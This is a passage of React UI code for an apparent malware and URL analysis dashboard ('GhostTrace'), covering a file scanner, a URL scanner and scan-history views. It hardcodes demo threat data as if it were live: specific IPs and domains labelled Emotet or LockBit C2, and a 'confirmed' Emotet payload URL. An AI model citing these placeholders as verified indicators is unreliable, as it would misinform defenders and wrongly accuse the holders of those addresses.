      <div className="scan-steps">
        {steps.map((s, i) => {
          const isDone = done.includes(i);
          const isRun = cur === i && !isDone;
          const st = isDone ? "done" : isRun ? "running" : "pending";
          return (
            <div key={i} className="s-step">
              <div className="s-ic">
                {isDone
                  ? <span style={{ color: "var(--green)" }}>✓</span>
                  : isRun ? <Spinner />
                  : <span style={{ color: "var(--t3)" }}>○</span>}
              </div>
              <div className={`s-lbl ${st}`}>{s.label}</div>
              <div className={`s-stat ${st}`}>{isDone ? "Done" : isRun ? "Running…" : "Queued"}</div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function Toggle({ on, onChange }) {
  return (
    <div className={`toggle-wrap ${on ? "on" : ""}`} onClick={onChange}>
      <div className="toggle-knob" />
    </div>
  );
}

function useScan(steps) {
  const [phase, setPhase] = useState("idle");
  const [cur, setCur] = useState(-1);
  const [done, setDone] = useState([]);
  const start = useCallback(() => {
    setPhase("scanning"); setCur(0); setDone([]);
    let i = 0;
    const run = () => {
      if (i >= steps.length) { setPhase("done"); return; }
      setCur(i);
      setTimeout(() => { const idx = i; setDone(p => [...p, idx]); i++; run(); }, steps[i].dur);
    };
    run();
  }, [steps]);
  const reset = useCallback(() => { setPhase("idle"); setCur(-1); setDone([]); }, []);
  return { phase, cur, done, start, reset };
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: DASHBOARD
// ═══════════════════════════════════════════════════════════════════════════════

function Dashboard({ setView }) {
  const lvlBg = { critical:"rgba(255,45,85,.1)", high:"rgba(255,170,0,.1)", medium:"rgba(59,130,246,.1)", low:"rgba(0,255,136,.08)", clean:"rgba(0,255,136,.08)" };
  const typeIcon = { file:"📁", url:"🌐", log:"📋", ioc:"🔗" };
  return (
    <div className="view">
      <div className="stat-grid">
        <div className="stat c-cyan"><div className="stat-val" style={{color:"var(--cyan)"}}>247</div><div className="stat-lbl">Total Scans</div><div className="stat-sub">↑ 12 this week</div></div>
        <div className="stat c-red"><div className="stat-val" style={{color:"var(--red)"}}>38</div><div className="stat-lbl">Threats Detected</div><div className="stat-sub">15.4% detection rate</div></div>
        <div className="stat c-amber"><div className="stat-val" style={{color:"var(--amber)"}}>1,204</div><div className="stat-lbl">IOCs Extracted</div><div className="stat-sub">IPs, domains, hashes</div></div>
        <div className="stat c-green"><div className="stat-val" style={{color:"var(--green)"}}>62</div><div className="stat-lbl">Reports Generated</div><div className="stat-sub">PDF forensic reports</div></div>
      </div>

      <div className="g2 mb20">
        <div className="card">
          <div className="card-hd">
            <span className="card-title">⏱ Recent Scans</span>
            <button className="btn btn-ghost btn-sm" onClick={() => setView("history")}>All scans →</button>
          </div>
          <div className="card-body">
            {HISTORY.slice(0, 6).map((s, i) => (
              <div key={i} className="act-item">
                <div className="act-icon-box" style={{ background: lvlBg[s.level] || lvlBg.low }}>{typeIcon[s.type]}</div>
                <div className="f1" style={{ minWidth: 0 }}>
                  <div className="act-name">{s.name}</div>
                  <div className="act-meta">{s.type.toUpperCase()} · {s.date} · {s.findings} findings</div>
                </div>
                <Badge level={s.level} />
              </div>
            ))}
          </div>
        </div>

        <div style={{ display:"flex", flexDirection:"column", gap:13 }}>
          <div className="card">
            <div className="card-hd"><span className="card-title">📊 Threat Breakdown</span></div>
            <div className="card-body">
              {[{l:"Critical",n:8,c:"var(--red)",p:21,pb:"red"},{l:"High",n:14,c:"var(--amber)",p:37,pb:"amber"},{l:"Medium",n:11,c:"var(--blue)",p:29,pb:"blue"},{l:"Low / Clean",n:5,c:"var(--green)",p:13,pb:"green"}].map(r => (
                <div key={r.l} className="mb12">
                  <div className="fjsb mb6 mono txt-xs"><span style={{color:r.c}}>{r.l}</span><span className="txt-muted">{r.n} scans</span></div>
                  <Pbar val={r.p} color={r.pb} />
                </div>
              ))}
            </div>
          </div>
          <div className="card">
            <div className="card-hd"><span className="card-title">⚡ Quick Launch</span></div>
            <div className="card-body" style={{ display:"flex", flexDirection:"column", gap:8 }}>
              <button className="btn btn-primary w100" onClick={() => setView("file-scan")}>🔍 Scan File / Malware</button>
              <button className="btn btn-sec w100" onClick={() => setView("url-scan")}>🌐 Scan URL / Website</button>
              <button className="btn btn-ghost w100" onClick={() => setView("log-scan")}>📋 Analyze Logs</button>
              <button className="btn btn-ghost w100" onClick={() => setView("ioc")}>🔗 Extract IOCs</button>
              <button className="btn btn-ghost w100" onClick={() => setView("timeline")}>🕵 Attack Timeline</button>
            </div>
          </div>
        </div>
      </div>

      <div className="card">
        <div className="card-hd">
          <span className="card-title">🌍 Live Threat Intelligence Feed</span>
          <span className="fac gap6 mono txt-xs txt-muted"><span className="live-dot" />LIVE · Updated 5 min ago</span>
        </div>
        <div style={{ padding: 0 }}>
          <table className="tbl">
            <thead><tr><th>Indicator</th><th>Type</th><th>Malware / Threat</th><th>Source</th><th>Confidence</th><th>Status</th></tr></thead>
            <tbody>
              {[
                ["185.220.101.47","IP","Emotet C2","AbuseIPDB",94,"critical"],
                ["secure-paypa1.com","Domain","PayPal Phishing","PhishTank",98,"critical"],
                ["a1b2c3d4e5f6…","MD5","Emotet Dropper","VirusTotal",87,"critical"],
                ["malware-cdn.ru","Domain","Malware CDN","URLScan",76,"high"],
                ["45.142.212.100","IP","LockBit 3.0 C2","ThreatFox",91,"critical"],
                ["update-flash.xyz","Domain","Fake Flash Updater","ESET",83,"high"],
              ].map(([ioc, type, threat, src, conf, level], i) => (
                <tr key={i}>
                  <td><span className="hash-pill">{ioc}</span></td>
                  <td><Badge level={type === "IP" ? "info" : "purple"}>{type}</Badge></td>
                  <td style={{ color:"var(--t1)" }}>{threat}</td>
                  <td className="txt-muted">{src}</td>
                  <td><div className="fac gap6"><div style={{width:60}}><Pbar val={conf} color={conf > 85 ? "red" : "amber"} /></div><span className="mono txt-xs txt-muted" style={{minWidth:28}}>{conf}%</span></div></td>
                  <td><Badge level={level}>{level.toUpperCase()}</Badge></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: SCAN HISTORY
// ═══════════════════════════════════════════════════════════════════════════════

function ScanHistory({ setView, historyItems = HISTORY }) {
  const [q, setQ] = useState("");
  const [fType, setFType] = useState("all");
  const [fLevel, setFLevel] = useState("all");
  const typeIcon = { file:"📁", url:"🌐", log:"📋", ioc:"🔗" };
  const lvlBg = { critical:"rgba(255,45,85,.1)", high:"rgba(255,170,0,.1)", medium:"rgba(59,130,246,.1)", low:"rgba(0,255,136,.08)", clean:"rgba(0,255,136,.08)" };

  const filtered = useMemo(() => historyItems.filter(s => {
    const mQ = !q || s.name.toLowerCase().includes(q.toLowerCase());
    const mT = fType === "all" || s.type === fType;
    const mL = fLevel === "all" || s.level === fLevel;
    return mQ && mT && mL;
  }), [q, fType, fLevel, historyItems]);

  return (
    <div className="view">
      <div className="fjsb mb20">
        <div>
          <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>📊 Scan History</div>
          <div className="txt-sec txt-sm">All {historyItems.length} past scans — searchable and filterable</div>
        </div>
        <button className="btn btn-primary" onClick={() => setView("file-scan")}>+ New Scan</button>
      </div>

      <div className="fac gap10 mb16">
        <div className="search-bar f1">
          <span className="txt-muted" style={{ fontSize:14 }}>🔍</span>
          <input placeholder="Search by filename, URL, or target…" value={q} onChange={e => setQ(e.target.value)} />
        </div>
        <select className="inp sel" style={{ width:130 }} value={fType} onChange={e => setFType(e.target.value)}>
          <option value="all">All Types</option>
          <option value="file">File</option>
          <option value="url">URL</option>
          <option value="log">Log</option>
          <option value="ioc">IOC</option>
        </select>
        <select className="inp sel" style={{ width:140 }} value={fLevel} onChange={e => setFLevel(e.target.value)}>
          <option value="all">All Levels</option>
          <option value="critical">Critical</option>
          <option value="high">High</option>
          <option value="medium">Medium</option>
          <option value="low">Low</option>
          <option value="clean">Clean</option>
        </select>
      </div>

      <div className="card">
        <div className="card-hd">
          <span className="card-title">🔎 Results</span>
          <span className="mono txt-xs txt-muted">{filtered.length} of {historyItems.length} scans</span>
        </div>
        <div style={{ padding:0 }}>
          <table className="tbl">
            <thead>
              <tr><th>Target</th><th>Type</th><th>Risk</th><th>Level</th><th>Findings</th><th>IOCs</th><th>Date</th><th>Actions</th></tr>
            </thead>
            <tbody>
              {filtered.map((s, i) => (
                <tr key={i}>
                  <td>
                    <div className="fac gap8">
                      <div style={{ width:28, height:28, borderRadius:6, background:lvlBg[s.level], display:"flex", alignItems:"center", justifyContent:"center", fontSize:13, flexShrink:0 }}>{typeIcon[s.type]}</div>
                      <span style={{ color:"var(--t1)", fontWeight:600, maxWidth:200, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{s.name}</span>
                    </div>
                  </td>
                  <td><Badge level={s.type}>{s.type.toUpperCase()}</Badge></td>
                  <td>
                    <div className="fac gap6">
                      <span className="mono txt-xs" style={{ color: s.level === "critical" ? "var(--red)" : s.level === "high" ? "var(--amber)" : s.level === "medium" ? "var(--blue)" : "var(--green)" }}>{s.risk}</span>
                      <div style={{ width:44 }}><Pbar val={s.risk} color={s.level === "critical" || s.level === "high" ? "red" : "green"} /></div>
                    </div>
                  </td>
                  <td><Badge level={s.level}>{s.level}</Badge></td>
                  <td><span className="mono txt-xs" style={{ color: s.findings > 0 ? "var(--amber)" : "var(--t3)" }}>{s.findings}</span></td>
                  <td><span className="mono txt-xs" style={{ color: s.iocs > 0 ? "var(--cyan)" : "var(--t3)" }}>{s.iocs}</span></td>
                  <td className="mono txt-xs txt-muted tbl-nowrap">{s.date}</td>
                  <td>
                    <div className="fac gap6">
                      <button className="btn btn-ghost btn-sm">View</button>
                      <button className="btn btn-ghost btn-sm">⬇ PDF</button>
                    </div>
                  </td>
                </tr>
              ))}
              {filtered.length === 0 && (
                <tr><td colSpan={8}><div className="empty-state"><div className="empty-icon">🔍</div><div className="empty-title">No results</div><div className="empty-sub">No scans match your search or filters.</div></div></td></tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: FILE SCANNER
// ═══════════════════════════════════════════════════════════════════════════════

function FileScanner() {
  const { phase, cur, done, start, reset } = useScan(FILE_STEPS);
  const [fname, setFname] = useState("");
  const [tab, setTab] = useState("overview");
  const [drag, setDrag] = useState(false);
  const [selectedFile, setSelectedFile] = useState(null);
  const [result, setResult] = useState(D_FILE);
  const fileRef = useRef();
  const r = result;

  const go = useCallback(fileOrName => {
    if (typeof fileOrName === "string") {
      setFname(fileOrName || "invoice_update_Q4.exe");
      setSelectedFile(null);
    } else if (fileOrName) {
      setFname(fileOrName.name || "uploaded-file");
      setSelectedFile(fileOrName);
    }
    start();
  }, [start]);
  const resetAll = () => { reset(); setFname(""); setTab("overview"); setDrag(false); setSelectedFile(null); setResult(D_FILE); };

  useEffect(() => {
    if (phase !== "done" || !selectedFile) return;
    (async () => {
      try {
        const fd = new FormData();
        fd.append("file", selectedFile);
        const data = await apiJson("/api/analyze-file", { method: "POST", body: fd });
        setResult({
          ...D_FILE,
          filename: data.filename || selectedFile.name,
          type: data.file_type || D_FILE.type,
          entropy: Number(data.entropy ?? D_FILE.entropy),
          md5: data.hashes?.md5 || D_FILE.md5,
          sha1: data.hashes?.sha1 || D_FILE.sha1,
          sha256: data.hashes?.sha256 || D_FILE.sha256,
          strings: (data.suspicious_strings || []).map((v) => ({ v, sus: true })),
          iocs: data.iocs || D_FILE.iocs,
          risk: Number(data.risk?.score ?? D_FILE.risk),
          level: String(data.risk?.severity || "critical").toUpperCase(),
          ai: data.ai_summary || D_FILE.ai,
        });
      } catch {
        setResult((prev) => ({ ...prev, filename: selectedFile.name }));
      }
    })();
  }, [phase, selectedFile]);

  return (
    <div className="view">
      {phase === "idle" && (
        <>
          <div className="mb20">
            <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>🔍 File Scanner</div>
            <div className="txt-sec txt-sm">Deep static analysis — hashes, entropy, YARA signatures, strings, AI classification</div>
          </div>
          <div className="card mb16">
            <div className="card-body">
              <div
                className={`drop-zone ${drag ? "dragging" : ""}`}
                onClick={() => fileRef.current?.click()}
                onDragOver={e => { e.preventDefault(); setDrag(true); }}
                onDragLeave={() => setDrag(false)}
                onDrop={e => { e.preventDefault(); setDrag(false); const f = e.dataTransfer.files[0]; if (f) go(f); }}
              >
                <span className="dz-icon">📁</span>
                <div className="dz-title">Drop file here or click to browse</div>
                <div className="dz-sub">
                  EXE · DLL · PDF · DOC · JS · ZIP · APK · Any file type · Max 50MB<br />
                  Files analyzed locally — never uploaded to any third-party server
                </div>
                <input ref={fileRef} type="file" style={{ display:"none" }} onChange={e => { const f = e.target.files[0]; if (f) go(f); }} />
              </div>
            </div>
          </div>
          <div className="feat-grid mb18">
            {[{e:"🔐",n:"Hash Analysis",d:"MD5 / SHA1 / SHA256 + VirusTotal lookup"},
              {e:"⚡",n:"Entropy Scan",d:"Detect packed, encrypted, or compressed payloads"},
              {e:"🔎",n:"String Extraction",d:"Commands, URLs, registry keys, DLL names"},
              {e:"🛡",n:"YARA Signatures",d:"10,204 curated malware detection rules"},
              {e:"📊",n:"PE Analysis",d:"Sections, imports, exports, overlay, headers"},
              {e:"🤖",n:"AI Classification",d:"Explainable threat analysis with evidence"},
            ].map(f => <div key={f.n} className="feat-card"><div className="feat-icon">{f.e}</div><div className="feat-name">{f.n}</div><div className="feat-desc">{f.d}</div></div>)}
          </div>
          <button className="btn btn-primary btn-lg" onClick={() => go("invoice_update_Q4.exe")}>🚀 Demo Scan — Emotet Trojan sample</button>
        </>
      )}

      {phase === "scanning" && (
        <div className="card">
          <div className="card-hd"><span className="card-title fac gap8"><Spinner /> Scanning: {fname}</span></div>
          <div className="card-body"><ScanProgress steps={FILE_STEPS} cur={cur} done={done} /></div>
        </div>
      )}

      {phase === "done" && (
        <>
          <div className="fjsb gap12 mb20">
            <div>
              <div style={{ fontSize:18, fontWeight:800, marginBottom:4 }}>Scan Complete — {r.filename}</div>
              <div className="mono txt-xs txt-muted">{new Date().toLocaleString()} · VirusTotal: {r.vt_ratio} engines flagged</div>
            </div>
            <div className="fac gap8">
              <button className="btn btn-ghost" onClick={resetAll}>↩ New Scan</button>
              <button className="btn btn-sec">📄 View Report</button>
              <button className="btn btn-primary" onClick={async () => { if (!selectedFile) return; try { const fd = new FormData(); fd.append("file", selectedFile); const blob = await apiBlob("/api/generate-report", { method: "POST", body: fd }); downloadBlob(blob, `ghosttrace_report_${selectedFile.name}.pdf`); } catch (e) { reportClientError("File report download failed", e); } }}>⬇ Download PDF</button>
            </div>
          </div>

          <RiskDisplay score={r.risk} level={r.level}>
            <div className="txt-sec txt-sm mb6">{r.yara.length} YARA rules matched · {r.imports.length} suspicious API imports · Persistence mechanism detected</div>
            <div className="mono txt-xs txt-muted">Engine: GhostTrace AI v2.0 + YARA 4.3 · Confidence: 94%</div>
          </RiskDisplay>

          <div className="tabs">
            {[["overview","📋 Overview"],["entropy","📊 Entropy & PE"],["strings","🔤 Strings"],["iocs","🔗 IOCs"],["ai","🤖 AI Analysis"]].map(([id, lbl]) => (
              <button key={id} className={`tab ${tab === id ? "on" : ""}`} onClick={() => setTab(id)}>{lbl}</button>
            ))}
          </div>

          {tab === "overview" && (
            <div className="g2">
              <div className="card">
                <div className="card-hd"><span className="card-title">📁 File Metadata</span></div>
                <div className="card-body">
                  <table className="tbl"><tbody>
                    <tr><td className="txt-muted" style={{width:90}}>Filename</td><td style={{color:"var(--t1)"}}>{r.filename}</td></tr>
                    <tr><td className="txt-muted">File Type</td><td style={{color:"var(--t1)"}}>{r.type}</td></tr>
                    <tr><td className="txt-muted">Size</td><td style={{color:"var(--t1)"}}>{r.size}</td></tr>
                    <tr><td className="txt-muted">Packed</td><td><Badge level={r.packed?"critical":"clean"}>{r.packed?"Yes — UPX Modified":"No"}</Badge></td></tr>
                    <tr><td className="txt-muted">Signed</td><td><Badge level={r.signed?"clean":"critical"}>{r.signed?"Valid Signature":"Unsigned ⚠"}</Badge></td></tr>
                    <tr><td className="txt-muted">VT Ratio</td><td style={{color:"var(--red)",fontWeight:700}}>{r.vt_ratio} flagged</td></tr>
                    <tr><td className="txt-muted">MD5</td><td><span className="hash-pill">{r.md5}</span></td></tr>
                    <tr><td className="txt-muted">SHA1</td><td><span className="hash-pill">{r.sha1.slice(0,24)}…</span></td></tr>
                    <tr><td className="txt-muted">SHA256</td><td><span className="hash-pill">{r.sha256.slice(0,28)}…</span></td></tr>
                  </tbody></table>
                </div>
              </div>
              <div>
                <div className="card mb14">
                  <div className="card-hd"><span className="card-title">🛡 YARA Matches ({r.yara.length})</span></div>
                  <div className="card-body">
                    {r.yara.map((y, i) => (
                      <div key={i} className="yara-hit">
                        <span>⚑</span>
                        <span className="yara-name">{y}</span>
                        <Badge level="critical">HIT</Badge>
                      </div>
                    ))}
                  </div>
                </div>
                <div className="card">
                  <div className="card-hd"><span className="card-title">💻 Suspicious API Imports</span></div>
                  <div className="card-body">
                    <div className="err-box mb12">Process injection triad detected — high-confidence code injection capability</div>
                    <div className="ioc-grid">{r.imports.map(imp => <span key={imp} className="ioc ioc-cmd">⚙ {imp}</span>)}</div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {tab === "entropy" && (
            <div className="g2">
              <div className="card">
                <div className="card-hd"><span className="card-title">📊 Section Entropy Analysis</span></div>
                <div className="card-body">
                  {r.sections.map(s => <EntropyBar key={s.n} name={s.n} val={s.e} sus={s.s} />)}
                  <div className="warn-box mt12">
                    <strong>Entropy &gt; 7.5 =</strong> packing, encryption, or obfuscation.<br />
                    Normal executables score 4.0–6.5. Near-maximum values in .text and .rsrc confirm runtime unpacking.
                  </div>
                </div>
              </div>
              <div className="card">
                <div className="card-hd"><span className="card-title">📋 PE Section Table</span></div>
                <div className="card-body">
                  <table className="tbl">
                    <thead><tr><th>Section</th><th>Entropy</th><th>Classification</th></tr></thead>
                    <tbody>
                      {r.sections.map(s => (
                        <tr key={s.n}>
                          <td className="mono" style={{ color:"var(--t1)" }}>{s.n}</td>
                          <td><span className="mono txt-xs" style={{ color: s.e > 7.5 ? "var(--red)" : s.e > 6.5 ? "var(--amber)" : "var(--green)" }}>{s.e.toFixed(2)}</span></td>
                          <td><Badge level={s.s ? "critical" : "clean"}>{s.s ? "SUSPICIOUS" : "NORMAL"}</Badge></td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                  <div className="info-box mt12">Overall file entropy: <strong>{r.entropy}</strong> — heavily packed binary consistent with Emotet UPX loader.</div>
                </div>
              </div>
            </div>
          )}

          {tab === "strings" && (
            <div className="card">
              <div className="card-hd"><span className="card-title">🔤 Extracted Strings — Suspicious Patterns</span></div>
              <div className="card-body">
                <table className="tbl">
                  <thead><tr><th>String / Pattern</th><th>Risk</th></tr></thead>
                  <tbody>
                    {r.strings.map((s, i) => (
                      <tr key={i}>
                        <td><span className="hash-pill" style={{ color: s.sus ? "var(--red)" : "var(--t2)" }}>{s.v}</span></td>
                        <td><Badge level={s.sus ? "critical" : "clean"}>{s.sus ? "⚠ Suspicious" : "Clean"}</Badge></td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                <div className="warn-box mt16">
                  <strong>C2 URL hardcoded:</strong> http://185.220.101.47/payload.bin<br />
                  Block this IP at your firewall immediately. The URL is a confirmed Emotet stage-2 download endpoint.
                </div>
              </div>
            </div>
          )}

          {tab === "iocs" && (
            <div className="card">
              <div className="card-hd"><span className="card-title">🔗 Extracted IOCs</span><button className="btn btn-ghost btn-sm">⬇ Export JSON</button></div>
              <div className="card-body"><IOCPanel iocs={r.iocs} /></div>
            </div>
          )}

          {tab === "ai" && <Terminal title="File Threat Analysis — Emotet Dropper" content={r.ai} />}
        </>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: URL / WEBSITE SCANNER
// ═══════════════════════════════════════════════════════════════════════════════

function URLScanner() {
  const { phase, cur, done, start, reset } = useScan(URL_STEPS);
  const [url, setUrl] = useState("");
  const [tab, setTab] = useState("overview");
  const [scanUrl, setScanUrl] = useState("");
  const [result, setResult] = useState(D_URL);
  const [scanError, setScanError] = useState("");
  const [loadingResult, setLoadingResult] = useState(false);
  const r = result;
  const riskVal = Number(r.risk || 0);
  const riskState = riskVal >= 75 ? "critical" : riskVal >= 50 ? "high" : riskVal >= 25 ? "medium" : "low";
  const hasMaliciousInjection = (r.injections || []).some((inj) => String(inj?.detail || "").toLowerCase() !== "no direct web injection pattern identified.");
  const hasContentRedFlags = Boolean(r.content?.login_form || r.content?.pass_field || r.content?.obfuscated_js || (r.content?.hidden_iframes || 0) > 0 || (r.content?.ext_scripts || []).length > 0);
  const sslStatus = r.ssl?.valid ? "Valid" : "Unavailable or failed";
  const domainAgeWarn = r.domain_age && r.domain_age !== "N/A" ? String(r.domain_age).toLowerCase().includes("new") : false;

  const go = useCallback(u => {
    if (!u) return;
    setUrl(u);
    setScanUrl(u);
    setScanError("");
    setLoadingResult(true);
    setResult({
      ...mapUrlResult({}, u),
      url: u,
      redirects: [u],
      checks: [],
      injections: [],
      vulns: [],
      tech: [],
      url_timeline: [],
      ai: "Running scan...",
    });
    start();
  }, [start]);
  const resetAll = () => { reset(); setTab("overview"); setScanError(""); setLoadingResult(false); };

  useEffect(() => {
    if (phase !== "done" || !scanUrl) return;
    (async () => {
      try {
        const data = await apiJson("/api/analyze-url", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: scanUrl }) });
        setResult(mapUrlResult(data, scanUrl));
      } catch (e) {
        reportClientError("URL analysis failed", e);
        const msg = e?.message || "URL analysis request failed.";
        setScanError(msg);
      } finally {
        setLoadingResult(false);
      }
    })();
  }, [phase, scanUrl]);

  return (
    <div className="view">
      {phase === "idle" && (
        <>
          <div className="mb20">
            <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>🌐 URL & Website Scanner</div>
            <div className="txt-sec txt-sm">Phishing · Malware injection · Vulnerabilities · Health score · AI attack reconstruction</div>
          </div>
          <div className="card mb16">
            <div className="card-body">
              <label className="inp-label">Target URL / Website</label>
              <div className="fac gap8 mb12">
                <input className="inp f1" placeholder="https://suspicious-site.com or paste any URL…" value={url} onChange={e => setUrl(e.target.value)} onKeyDown={e => e.key === "Enter" && url && go(url)} />
                <button className="btn btn-primary" onClick={() => go(url)} disabled={!url}>Scan →</button>
              </div>
              <div className="ok-box">🔒 Passive analysis only — no credentials sent, no active exploitation or modification performed on target.</div>
            </div>
          </div>
          <div className="feat-grid mb18">
            {[{e:"🔒",n:"SSL / TLS Analysis",d:"Certificate validity, chain, issuer trust"},
              {e:"🎭",n:"Phishing Detection",d:"Domain spoofing, typosquatting, brand impersonation"},
              {e:"💉",n:"Malware Injection",d:"Web shells, injected scripts, iframes, backdoors"},
              {e:"🔍",n:"Vulnerability Scan",d:"Misconfigs, EOL software, missing security headers"},
              {e:"🏥",n:"Security Health Score",d:"5-dimension scorecard: SSL, malware, vulns, rep, content"},
              {e:"🕵",n:"AI Attack Chain",d:"AI reconstructs how the site was compromised"},
            ].map(f => <div key={f.n} className="feat-card"><div className="feat-icon">{f.e}</div><div className="feat-name">{f.n}</div><div className="feat-desc">{f.d}</div></div>)}
          </div>
          <button className="btn btn-primary btn-lg" onClick={() => go("https://secure-paypa1.com/login/verify?session=a9f3b")}>🚀 Demo Scan — PayPal phishing site</button>
        </>
      )}

      {phase === "scanning" && (
        <div className="card">
          <div className="card-hd"><span className="card-title fac gap8"><Spinner /> Scanning website…</span></div>
          <div className="card-body">
            <div className="err-box mb16">Target: <span style={{ color:"var(--t1)" }}>{url || r.url}</span></div>
            <ScanProgress steps={URL_STEPS} cur={cur} done={done} />
          </div>
        </div>
      )}

      {phase === "done" && (
        <>
          {loadingResult && (
            <div className="card mb12">
              <div className="card-hd"><span className="card-title fac gap8"><Spinner /> Fetching backend analysis result...</span></div>
              <div className="card-body">
                <div className="ok-box">Input URL: <strong>{scanUrl}</strong></div>
              </div>
            </div>
          )}
          {scanError && (
            <div className="err-box mb12">
              URL analysis failed: {scanError}
            </div>
          )}
          {!loadingResult && (
            <>
          <div className="fjsb gap12 mb20">
            <div>
              <div style={{ fontSize:18, fontWeight:800, marginBottom:4 }}>Scan Complete</div>
              <span className="hash-pill">{r.url}</span>
            </div>
            <div className="fac gap8">
              <button className="btn btn-ghost" onClick={resetAll}>↩ New Scan</button>
              <button className="btn btn-sec">📄 Report</button>
              <button className="btn btn-primary" onClick={async () => { try { const blob = await apiBlob("/api/generate-url-report", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: r.url }) }); downloadBlob(blob, "ghosttrace_url_report.pdf"); } catch (e) { reportClientError("URL report download failed", e); } }}>⬇ PDF</button>
            </div>
          </div>

          <RiskDisplay score={r.risk} level={r.level}>
            <div className="txt-sec txt-sm mb6">{String(r.level || "").toUpperCase()} risk · {r.vulns.length} vulnerability findings · {r.injections.length} injection indicators · {r.iocs?.domains?.length || 0} related domains</div>
            <div className="mono txt-xs txt-muted">Sources: VirusTotal · PhishTank · AbuseIPDB · URLScan.io · GhostTrace AI</div>
          </RiskDisplay>

          <div className="tabs">
            {[["overview","📋 Overview"],["health","🏥 Health Score"],["injections","💉 Injections"],["vulns","🔍 Vulns"],["content","🔬 Content"],["reputation","📡 Reputation"],["timeline","📅 Timeline"],["iocs","🔗 IOCs"],["ai","🤖 AI"]].map(([id, lbl]) => (
              <button key={id} className={`tab ${tab === id ? "on" : ""}`} onClick={() => setTab(id)}>{lbl}</button>
            ))}
          </div>

          {tab === "overview" && (
            <div className="g2">
              <div className="card">
                <div className="card-hd"><span className="card-title">🌍 Domain Information</span></div>
                <div className="card-body">
                  <table className="tbl"><tbody>
                    <tr><td className="txt-muted" style={{width:110}}>IP Address</td><td style={{color:r.ip && r.ip !== "N/A" ? "var(--t1)" : "var(--amber)"}}>{r.ip}{r.ip && r.ip !== "N/A" ? "" : " (unavailable)"}</td></tr>
                    <tr><td className="txt-muted">Country / ISP</td><td>{r.country} · {r.isp}</td></tr>
                    <tr><td className="txt-muted">Domain Age</td><td style={{color:domainAgeWarn ? "var(--red)" : "var(--t1)"}}>{r.domain_age}</td></tr>
                    <tr><td className="txt-muted">Registrar</td><td>{r.registrar}</td></tr>
                    <tr><td className="txt-muted">SSL Issuer</td><td style={{color:r.ssl.valid ? "var(--green)" : "var(--amber)"}}>{r.ssl.issuer}</td></tr>
                    <tr><td className="txt-muted">SSL Expiry</td><td style={{color:r.ssl.valid ? "var(--green)" : "var(--amber)"}}>{r.ssl.expiry} ({sslStatus})</td></tr>
                    <tr><td className="txt-muted">Redirect</td><td className="mono" style={{fontSize:10,color:"var(--t2)"}}>{r.redirects[0]}</td></tr>
                    <tr><td className="txt-muted">Stack</td><td style={{color:"var(--amber)"}}>{r.tech.join(" · ")}</td></tr>
                  </tbody></table>
                </div>
              </div>
              <div className="card">
                <div className="card-hd"><span className="card-title">✅ Security Checks ({r.checks.filter(c => c.ok === false).length} failed)</span></div>
                <div className="card-body">
                  {r.checks.map((c, i) => (
                    <div key={i} className="ck-row">
                      <div className="ck-ic">{c.ok === false ? "🔴" : c.ok === null ? "🟡" : "🟢"}</div>
                      <div className="ck-lbl">{c.n}</div>
                      <div className="ck-val" style={{ color: c.ok === false ? "var(--red)" : c.ok === null ? "var(--amber)" : "var(--green)" }}>{c.v}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {tab === "health" && (
            <>
              <div className="hs-wrap">
                <div style={{ textAlign:"center" }}>
                  <div className="hs-circle" style={{ background:"rgba(255,45,85,.08)", border:"3px solid rgba(255,45,85,.4)", boxShadow:"0 0 32px rgba(255,45,85,.2)" }}>
                    <span className="hs-score-val" style={{ color:"var(--red)" }}>{r.health.total}</span>
                    <span className="hs-score-max">/100</span>
                  </div>
                  <Badge level={riskState}>{String(r.level || riskState).toUpperCase()} RISK</Badge>
                </div>
                <div className="hs-bars">
                  {[
                    { l:"SSL Security",       s:r.health.ssl,     max:20, c:"red"   },
                    { l:"Malware Presence",   s:r.health.malware, max:30, c:"red"   },
                    { l:"Vulnerability Score",s:r.health.vulns,   max:20, c:"amber" },
                    { l:"Reputation Score",   s:r.health.rep,     max:15, c:"red"   },
                    { l:"Content Integrity",  s:r.health.content, max:15, c:"red"   },
                  ].map(b => (
                    <div key={b.l} className="hs-bar-row">
                      <div className="hs-bar-lbl">{b.l}</div>
                      <div className="hs-bar-track">
                        <div className="hs-bar-fill" style={{ width:`${Math.min((b.s/b.max)*100,100)}%`, background: b.c==="red"?"var(--red)":b.c==="amber"?"var(--amber)":"var(--green)" }} />
                      </div>
                      <div className="hs-bar-val" style={{ color: b.c==="red"?"var(--red)":b.c==="amber"?"var(--amber)":"var(--green)" }}>{b.s}/{b.max}</div>
                    </div>
                  ))}
                </div>
              </div>
              <div className="g3">
                {[
                  {t:"SSL Security",    s:`${r.health.ssl}/20`,     g:r.health.ssl < 8 ? "F" : r.health.ssl < 14 ? "D" : "B", desc:`TLS issuer: ${r.ssl?.issuer || "Unknown"}, expiry: ${r.ssl?.expiry || "Unknown"}.`,c:r.health.ssl < 10 ? "red" : "amber"},
                  {t:"Malware Presence",s:`${r.health.malware}/30`, g:r.health.malware < 12 ? "F" : r.health.malware < 20 ? "D" : "B", desc:`${r.injections.length} malware/injection indicators found from backend analysis.`,c:r.health.malware < 15 ? "red" : "amber"},
                  {t:"Vulnerabilities", s:`${r.health.vulns}/20`,   g:r.health.vulns < 8 ? "F" : r.health.vulns < 14 ? "D" : "B", desc:`${r.vulns.length} vulnerability findings and ${r.checks.length} security checks evaluated.`,c:r.health.vulns < 10 ? "red" : "amber"},
